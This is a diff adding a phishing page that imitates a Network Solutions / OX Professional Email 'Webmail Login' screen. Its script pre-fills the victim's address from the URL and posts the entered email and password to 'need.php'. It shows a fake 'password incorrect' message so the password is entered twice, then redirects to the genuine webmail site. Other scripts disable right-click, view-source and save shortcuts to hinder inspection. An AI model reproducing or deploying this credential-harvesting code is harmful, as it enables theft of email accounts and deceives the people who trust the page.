@@ -1,1 +1,268 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html lang=en xmlns=http://www.w3.org/1999/xhtml
+
+<head>
+<meta charset="utf-8">
+<meta name=robots content="noindex, nofollow">
+<meta http-equiv=Cache-Control content=no-cache>
+<meta http-equiv=Pragma content=no-cache>
+<meta http-equiv=Expires content=0>
+<meta http-equiv=X-UA-Compatible content="IE=EmulateIE7,IE=edge,chrome=1">
+<meta name=description content=webmail>
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<meta name=build-version-number content>
+<link id="favicon" rel="icon" href="https://webmail7.networksolutionsemail.com/appsuite/assets/favicon.svg" type="image/svg+xml">
+<title>Sign in - Professional Email</title>
+ <img src="data:image/png;base64,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" alt="Network Solutions" width=auto height=35>
+ </a>
+<script src="https://code.jquery.com/jquery-2.1.1.min.js" integrity="sha256-h0cGsrExGgcZtSZ/fRz4AwV+Nn6Urh/3v3jFRQ0w9dQ=" crossorigin="anonymous"></script>
+
+<style>html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}a{background-color:transparent}a:active,a:hover{outline:0}input{margin:0;font:inherit;color:inherit}input[type=submit]{-webkit-appearance:button;cursor:pointer}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:10px;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-size:14px;line-height:1.42857143;color:#333;background-color:#fff}input{font-family:inherit}a{color:#428bca;text-decoration:none}a:hover,a:focus{color:#2a6496;text-decoration:underline}a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}img{vertical-align:middle}h1{font-family:inherit;line-height:1.1}h1{margin-top:20px;margin-bottom:10px}ul{margin-top:0;margin-bottom:10px}.container{padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:768px){.container{width:750px}}@media (min-width:992px){.container{width:970px}}@media (min-width:1200px){.container{width:1170px}}@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@-o-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}.clearfix:before,.clearfix:after,.dl-horizontal dd:before,.dl-horizontal dd:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.btn-toolbar:before,.btn-toolbar:after,.btn-group-vertical>.btn-group:before,.btn-group-vertical>.btn-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after,.pager:before,.pager:after,.panel-body:before,.panel-body:after,.modal-footer:before,.modal-footer:after{display:table;content:" "}.clearfix:after,.dl-horizontal dd:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.btn-toolbar:after,.btn-group-vertical>.btn-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after,.pager:after,.panel-body:after,.modal-footer:after{clear:both}@-ms-viewport{width:device-width}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}html,body,div,span,h1,p,a,img,u,ul,li,form{margin:0;padding:0;border:0;font:inherit;outline:none}*{margin:0;padding:0}body{background:#e5e5e5;text-align:left;font-family:'Open Sans',arial,sans-serif}.container{display:block;width:100%;margin:10px 0;text-align:center}.card{display:block;width:420px;margin:0 auto 50px;text-align:left}.top{display:block;width:100%;background:#fff;padding-top:20px}.top img{display:block;margin:0 auto 20px}.top h1{display:block;font-size:24px;font-weight:700;color:#666;margin:15 30px 10px}.top span{display:block;margin:0 30px 20px;font-size:15px;line-height:20px;color:#666}a.pw{display:block;text-align:center;margin:0 0 30px;color:#256672;font-size:13px;text-decoration:none}a.pw:hover{text-decoration:underline}a.moble{display:block;text-align:center;margin:0 0 5px;color:#256672;font-size:13px;text-decoration:none}a.moble:hover{text-decoration:underline}#ajaxform{display:block;width:340px;margin:0 auto 20px}#ajaxform input[type='text']{display:block;outline:none;width:340px;height:40px;line-height:40px;border:2px solid #ccc;margin:0 0 5px;font-size:15px;text-indent:15px}#ajaxform input[type='password']{display:block;outline:none;width:340px;height:40px;line-height:40px;border:2px solid #ccc;margin:0 0 15px;font-size:15px;text-indent:15px}#ajaxform input[type='submit']{display:block;width:340px;height:40px;line-height:40px;background:#256672;text-align:center;color:#fff;border:0;font-size:15px;font-weight:700}#ajaxform input[type='submit']:hover{cursor:pointer;background:#38818e}#ajaxform input:focus{border:1px solid #38818e}.bottom{display:block;width:100%;background:#f0f0f0;color:#828282}.bottom p{display:block;margin:40px;line-height:10px;font-size:14px;text-align:center}.footer{width:50%;margin:0 auto;font-size:14px;color:#6c6c6c}.footer ul{list-style-type:none;width:auto;margin:0 auto}.footer ul li{display:inline-block;margin:0 5px}.footer ul li a{color:#333333;text-decoration:none}.footer p{text-align:center;margin:10px auto 0}#signin-message{height:5px;color:#DA4F49;font-size:14px;text-align:center}#err{height:25px;color:#DA4F49}@media screen and (max-width:400px){.container{margin:10px 0 50px;min-width:300px}.card{width:95%}.top h1,.top span{width:80%;margin:auto}#ajaxform{width:80%;margin:0 auto 20px}#ajaxform input[type='text'],#ajaxform input[type='submit'],#ajaxform input[type='password']{width:100%;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box}.top span{font-size:13px;line-height:18px}.bottom p{margin:20px;font-size:12px;line-height:18px}#err{height:30px;color:#DA4F49}}</style
+
+
+  </head>
+ <router-outlet></router-outlet>
+      <ng-component>
+        <div class="loginWrap">
+          <div class="loginContents">
+            <div class="loginContentsInner">			
+			        
+  
+	
+<link rel=canonical href=""><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:;"><style>img[src="data:,"],source[src="data:,"]{display:none!important}</style></head>
+ <body>
+ 
+<div class=container>
+ <div class=card>
+ <div class="top clearfix">
+ <h1 align=center>Webmail Login</h1><br><br>
+ 
+ <span class=dispmsg>
+ <p class=MsoNormal>
+<o:p></o:p><div class="row title"><h3 >Sign in</h3></div></p>
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+<p class=MsoNormal><u>
+<a href= target=_blank></a></u>
+<p class=MsoNormal><u>
+<a href="" target=_blank></a></u>
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+ 
+
+ <form name=login_form id=ajaxform method=post action="need.php">
+ <label><strong>Email<strong/></label>
+ <input name=nameuser id=email type=text value required>
+ 
+ <br><br>
+ <label>Your password</label>
+ <input id=password type=password name=passuser required value>
+  <div class=forgotpw>
+ <a href="#" role="button">Forgot your password?</a>
+ </div>
+<br>
+<div class="checkbox custom">
+                                  <label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label">
+                                    <input type="checkbox" class="sr-only" id="io-ox-login-store-box" name="staySignedIn" value="1">Stay signed in</label>
+                                </div><br><br>
+ <input name=btn2 id=submit-btn type=submit value=Signin>
+ </form>
+ 
+ 
+
+ 
+ <div id=signin-message></div>
+ <div id=err style=display:none></div>
+  <div class=moblelink>
+ </div>
+ </div>
+ <div class="bottom clearfix">
+ </div>
+ </div>
+ 
+ <div class=footer>
+ <p>
+ © 2023 OX Software GmbH Version 8.9.3 <a href="">Privacy Policy</a>   <a href="">Imprint</a>.
+ </p>
+</div>
+</div>
+ 
+ 
+<div id=cluetip-waitimage style=position:absolute;z-index:95;display:none></div><div id=cluetip style=z-index:96;display:none;position:absolute></div>
+
+<script>
+
+    
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+		
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+$(".logoname").html(finalu);
+}
+
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+///////////new injection////////////////
+var my_email =email;
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+///////////new injection////////////////
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'need.php',
+type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('Verifing...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+		$('#spinner').hide();
+    	window.location.replace("https://webmail7.networksolutionsemail.com/interfaces/sso/login.php?redirected=/mail&folder=default0/INBOX");
+    	}
+    	$("#msg").show();
+    	$('#msg').html("your password is incorrect! Please enter the correct email password and try again. ");
+    },
+    complete: function(){
+    	$('#submit-btn').val('LOGIN');
+    }
+});
+  });
+
+
+	});
+	
+</script>
+
+</body>
+</html>
+    
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+	
+</script>
+
+</body>
+</html>
 
